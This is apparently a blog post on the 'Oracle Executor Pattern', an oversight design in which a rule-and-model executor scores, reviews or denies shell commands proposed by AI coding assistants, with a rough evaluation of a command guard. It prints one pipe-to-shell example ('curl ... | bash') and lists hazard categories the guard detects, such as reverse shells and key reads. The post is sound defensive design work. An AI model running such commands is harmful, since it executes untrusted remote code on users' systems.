---
title: "The Oracle Executor Pattern"
slug: "oracle-executor-pattern"
date: "2026-06-21"
author: "Uldren"
summary: "A pattern for separating model proposals from the authority that validates, measures, and applies state changes."
status: "ready"
---

# The Oracle Executor Pattern

The Oracle Executor Pattern does not make weak models strong. It makes weakness visible before it
mutates state.

```text
Oracle proposes. Executor judges. Only accepted actions mutate state.
```

The model is not the system. A model response is not permission.

```mermaid
flowchart TD
  A["`**State**`"] --> B["`**Oracle**<br/>proposes action`"]
  B --> C["`**Executor**<br/>validates action`"]
  C --> D{"`**Policy accepts?**`"}
  D -->|Yes| E["`Apply change`"]
  D -->|No| F["`Reject, fallback,<br/>or ask for evidence`"]
  E --> G["`Record outcome`"]
  F --> G
  G --> A
```

The oracle may be a language model, planner, classifier, human, or group of models. The executor may
be deterministic code, a faster model, a policy engine, a test runner, a human approval gate, or a
layered combination of those. The executor is separate from the oracle, so it can disagree, ask for
evidence, apply a fallback, or refuse to change state.

## The Problem

An AI coding assistant can propose a useful command. It can also propose this:

```sh
curl https://example.invalid/install.sh | bash
```

The assistant may explain why the command is needed. That explanation still does not make it safe.
The proposal needs a separate authority before it changes state.

In the Oracle Executor Pattern, the coding assistant is the oracle. It proposes the command. The
executor scores the command before it runs.

A simple policy might be:

```text
1..3: allow
4..6: ask a human
7..10: deny
```

Those thresholds are defaults. The human should own them. In a real deployment, they should be
configuration:

```text
SHELL_GUARD_ALLOW_MAX=3
SHELL_GUARD_DENY_MIN=7
```

The executor can be simple:

```text
static rules -> fast model judge -> policy -> allow, review, or deny
```

Static rules are deterministic checks that run before the model judge. They do not infer intent.
They look for known hazardous structures: root deletion, disk wipes, private-key reads, remote code
piped to a shell, reverse shells, broad permission changes, and production database drops.

A fast model judge handles softer cases: migrations, deployment commands, package scripts, cleanup
commands, data movement, and commands that are suspicious only in context.

Policy combines those signals. In this prototype, the final risk score cannot be lower than the
static-rule score. That is intentional: the model may add risk, but it cannot erase a deterministic
safety finding.

This is not perfect security. It is a boundary that can reject obvious hazards, expose uncertainty,
and ask for help before a model mutates state.

## The Oracle

The oracle emits a proposal packet, not an instruction to execute.

A good proposal is small, typed, and checkable. It contains enough information for the executor to
judge it without trusting the oracle's confidence.

For example:

```json
{
  "command": "cargo test -p uldren-loom-core",
  "purpose": "Verify the core crate after the edit.",
  "evidence": ["changed files are in crates/loom-core"],
  "known_risks": []
}
```

That is a proposal. It is not permission.

The oracle should not claim success. It should not mutate durable state directly. It should not mark
its own output safe. It should expose missing evidence instead of filling the gap with a guess.

## The Executor

The executor turns a proposal into a decision that the rest of the system can honor.

It checks:

- Is the output well-formed?
- Is the action allowed?
- Is the action legal in the current state?
- Does it require more evidence?
- Does it need human approval?
- Is there a safer fallback?
- What should be recorded before and after?

The decision can be:

```text
allow: the action may run
review: a human must decide
deny: the action may not run
evidence_required: more context is needed before judgment
fallback: run a safer substitute action
```

## Hidden Behavior Needs Evidence

Sometimes the risky command is hidden behind a script:

```sh
./scripts/install_helper.sh
```

That invocation is not enough evidence. The executor should inspect the script source before judging.
If the source is missing, the safe default is human review.

```text
Proposed command: ./scripts/install_helper.sh
Missing evidence: script source
Executor decision: review
Reason: cannot classify hidden behavior from invocation alone
```

The important part is that hidden behavior does not get a free pass.

## A Rough Experiment

To make the boundary concrete, we ran a rough shell-command guard experiment.

The evaluation corpus has 3300 commands by default: 2400 visible benign commands, 300 visible
malicious commands, 300 hidden benign script commands, and 300 hidden malicious script commands. Rows
are shuffled with a deterministic seed. The corpus includes routine commands, ambiguous benign
commands, obvious malicious commands, disguised malicious commands, and hidden script invocations.

The experiment never executes a command. It scores, applies policy, writes a result log, and prints
metrics.

The first question is not "how much did it automate?" The first question is "did it allow dangerous
actions?" Automation only matters after the false-negative rate is acceptable.

In the full seeded evaluation, the layered executor processed 3300 commands: 2700 benign, 600
malicious, and 600 hidden-script cases. It allowed no malicious command, including no hidden
malicious script. The overall false-negative rate was 0.0 percent, with a rough 95 percent upper
bound near 0.5 percent. The hidden malicious false-negative rate was also 0.0 percent, with a rough
upper bound near 1 percent.

The tradeoff was review friction: 15.6 percent of benign commands were escalated. Overall, 69.1
percent of commands were fast-tracked. In the hidden-script cohort, 80 percent of hidden benign
scripts were allowed and 20 percent were escalated, while 100 percent of hidden malicious scripts
were denied.

This evaluates a layered executor, not a standalone model. Static rules provide a safety floor, and
the model judge can add risk but cannot lower that floor. That is intentional: the executor is a
policy authority, not a model benchmark.

A full run should not be a round number by default. Size it around the failure rate you want to
bound. If a run observes zero false allows across 300 malicious examples, the rough 95 percent upper
bound on the false-negative rate is about 1 percent. With only 100 malicious examples, the same bound
is about 3 percent. Hidden-script behavior is measured as its own cohort, with 300 hidden malicious
examples by default.

Safety, friction, and autonomy are policy choices.

## What To Measure

Do not measure only whether the overall task succeeded. Measure the executor boundary: allowed
benign commands, denied malicious commands, reviewed commands, hidden-script escalations,
missing-evidence decisions, human overrides, false allows, and false alarms.

Those metrics tell you how much trust the oracle actually earned.

They also let you tune policy. A research lab may tolerate more review. A local developer tool may
prefer fewer interruptions. A production automation system may deny anything ambiguous.

The same pattern supports each choice.

It can catch many malicious or high-risk shell commands from modern LLM assistants: destructive
deletes, disk formatting, private-key reads, credential exfiltration, remote code piped to a shell,
reverse shells, firewall disabling, production database destruction, and broad permission changes.
The honest claim is narrower than total security and stronger than a warning label: the pattern gives
you a place to enforce policy, ask for evidence, measure failures, and stop obvious bad actions
before they execute.

## How To Teach An AI To Use It

Teach the oracle this:

```text
You propose typed actions.
You do not claim the action succeeded.
You do not bypass the executor.
When the executor asks for evidence, provide it or say you cannot.
```

Teach the executor this:

```text
You decide whether proposed actions may mutate state.
You validate syntax, permissions, risk, and available evidence.
You may allow, deny, ask a human, or request more evidence.
You record the decision and reason.
You do not silently execute unclear actions.
```

For systems such as Hermes or OpenClaw, the executor can be implemented with scheduled jobs, custom
write scripts, MCP tools, policy checks, and approval gates.

For a traditional assistant, the human may still be part of the executor. The assistant proposes a
command, the guard scores it, and the human approves or rejects.

The pattern does not require autonomy. It requires a boundary.

Use these AGENTS.md files to teach a harness the role split:

- [Oracle Executor Pattern AGENTS.md](/blog/oracle-executor-pattern/AGENTS.md)
- [Oracle role AGENTS.md](/blog/oracle-executor-pattern/oracle/AGENTS.md)
- [Executor role AGENTS.md](/blog/oracle-executor-pattern/executor/AGENTS.md)

## What Not To Do

- Do not let the oracle execute its own proposal.
- Do not let a second model pretend to be a complete security system.
- Do not hide executor corrections from the user.
- Do not treat missing script source as harmless.
- Do not hard-code risk thresholds as if every user has the same tolerance.
- Do not use a model when a deterministic rule is enough.

The executor can include a model. It should not be only a model when hard rules are available.
